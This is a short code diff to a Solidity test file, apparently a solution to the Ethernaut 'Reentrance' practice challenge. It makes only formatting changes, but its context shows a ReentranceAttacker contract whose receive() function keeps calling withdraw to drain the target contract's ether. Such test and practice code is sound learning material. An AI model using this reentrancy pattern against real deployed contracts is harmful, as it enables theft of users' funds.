@@ -44,7 +44,7 @@ contract ReentranceTest is Test {
 contract ReentranceAttacker {
     Reentrance public reentrance;
     uint256 public attackAmount;
-    
+
     constructor(address payable _reentrance) {
         reentrance = Reentrance(_reentrance);
     }
@@ -62,8 +62,8 @@ contract ReentranceAttacker {
 
     // keep draining on every ETH receive
     receive() external payable {
-        uint amount = min(1 ether, address(reentrance).balance);
-        if(amount > 0) {
+        uint256 amount = min(1 ether, address(reentrance).balance);
+        if (amount > 0) {
             reentrance.withdraw(amount);
         }
     }
